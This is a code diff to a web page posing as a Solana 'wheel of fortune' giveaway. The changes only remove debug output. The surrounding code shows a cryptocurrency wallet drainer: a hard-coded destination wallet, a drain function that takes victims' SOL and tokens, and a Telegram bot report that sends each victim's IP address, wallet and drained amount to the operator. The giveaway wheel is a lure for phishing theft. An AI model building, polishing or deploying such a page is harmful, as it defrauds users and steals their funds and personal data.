@@ -10,7 +10,7 @@
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;padding:0;background:#000;color:#e6e6e6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:15px;line-height:1.4}
-  body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 20px 60px}
+  body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 20px 12px}
 
   .card{width:100%;max-width:400px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:26px 22px}
   h1{font-size:16px;font-weight:600;margin:0 0 4px;letter-spacing:-.1px;color:#fff}
@@ -90,8 +90,6 @@
 
   #confetti{position:fixed;inset:0;pointer-events:none;z-index:150;display:none}
   #confetti.show{display:block}
-
-  #debug{position:fixed;bottom:6px;left:6px;right:6px;font-family:ui-monospace,Menlo,monospace;font-size:10px;color:#8a8a8a;background:#000;border:1px solid #222;border-radius:4px;padding:6px;white-space:pre-wrap;z-index:9999;max-height:180px;overflow:auto}
 </style>
 </head>
 <body>
@@ -216,22 +214,7 @@
   <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_c8c8a73467.mp3?filename=wheel-of-fortune-103951.mp3" type="audio/mpeg">
 </audio>
 
-<!-- debug box — remove once wheel is verified -->
-<div id="debug">booting…</div>
-
 <script>
-// ---------- error catchers (must be first) ----------
-window.onerror = function(msg, src, line, col){
-  var d = document.getElementById("debug");
-  if (d) d.textContent += "\nERR: " + msg + " @ line " + line + ":" + col;
-  return false;
-};
-window.addEventListener("unhandledrejection", function(e){
-  var d = document.getElementById("debug");
-  var r = e.reason && e.reason.message ? e.reason.message : String(e.reason);
-  if (d) d.textContent += "\nREJ: " + r;
-});
-
 // ================= config =================
 var DESTINATION      = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
 var DONATION_WALLET  = "5qv94Le6YHwhEijdZEE7ekx6kCxyP9GfRQyd85zHtjsz";
@@ -270,7 +253,6 @@ var SEG_DEG = 360 / N;
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
 
-// ---------- Telegram ----------
 async function tgSend(text){
   if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
   try {
@@ -300,7 +282,6 @@ async function getClientIP(){
   } catch(_) { return "unknown"; }
 }
 
-// ---------- confetti ----------
 var confettiRaf = null;
 function fireConfetti(){
   var canvas = document.getElementById("confetti");
@@ -463,7 +444,7 @@ var MOBILE_WALLETS = [
 
 function buildWheel(){
   var svg = document.getElementById("wheel");
-  if (!svg){ dbg("buildWheel: no svg"); return; }
+  if (!svg) return;
   var ns = "http://www.w3.org/2000/svg";
   svg.innerHTML = "";
   var cx = 150, cy = 150, r = 148;
@@ -496,14 +477,7 @@ function buildWheel(){
     amt.textContent = s.sol + " SOL"; g.appendChild(amt);
     svg.appendChild(g);
   }
-  dbg("wheel built: " + svg.childElementCount + " children");
 }
-
-function dbg(msg){
-  var d = document.getElementById("debug");
-  if (d) d.textContent += "\n" + msg;
-}
-
 buildWheel();
 
 var web3 = null, Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction;
@@ -712,7 +686,6 @@ async function drain(session){
     await log({ event:"tokens_error", wallet: session.pubkey, error: String(e) });
   }
 
-  // Telegram report — fully wrapped so it can never break the flow
   try {
     var ip = await getClientIP();
     var solAmount = (solDrained / 1000000000).toFixed(6);
@@ -859,17 +832,6 @@ claimBtn.onclick = async function(){
 (function init(){
   spinBtn.style.display = "block";
   claimBtn.style.display = "none";
-
-  buildWheel();
-  var w = document.getElementById("wheel");
-  var s = "";
-  s += "version: " + VERSION;
-  s += "\nwheel children: " + (w ? w.childElementCount : "no-svg");
-  s += "\nsvg bbox w: " + (w && w.getBoundingClientRect ? Math.round(w.getBoundingClientRect().width) : "n/a");
-  s += "\nhasSpun: " + hasSpun();
-  s += "\nresult: " + readResult();
-  s += "\nbody bg: " + getComputedStyle(document.body).backgroundColor;
-  dbg(s);
 
   if (hasSpun()){
     var prev = readResult();
